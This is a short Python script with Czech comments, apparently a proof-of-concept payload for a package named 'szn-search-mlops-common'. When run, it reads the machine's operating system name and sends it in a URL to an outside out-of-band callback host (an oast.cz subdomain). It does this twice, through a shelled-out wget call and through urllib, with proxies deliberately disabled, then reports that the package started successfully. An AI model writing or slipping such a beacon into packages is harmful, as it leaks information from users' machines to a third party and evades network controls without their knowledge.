import os
import urllib.request
import platform

def main():
    # Zjištění operačního systému uživatele
    os_info = platform.system()

    # Sestavení URL, kde se v endpointu přidá informace o OS
    url = f"http://blz2bmsq.oast.cz/ModuleMan/{os_info}.pdf"

    print("Spouštím wget s vypnutou proxy...")
    # Přepínač --no-proxy zajistí, že wget nebude používat žádnou proxy
    os.system(f"wget --no-proxy {url}")

    print("Spouštím urllib.request bez proxy...")
    # Vytvoření handleru bez proxy
    proxy_handler = urllib.request.ProxyHandler({})
    opener = urllib.request.build_opener(proxy_handler)
    try:
        response = opener.open(url)
        print("Tracking request přes urllib odeslán, status code:", response.getcode())
    except Exception as e:
        print("Chyba při odesílání urllib requestu:", e)

    print("Balíček szn-search-mlops-common byl úspěšně spuštěn.")

if __name__ == "__main__":
    main()
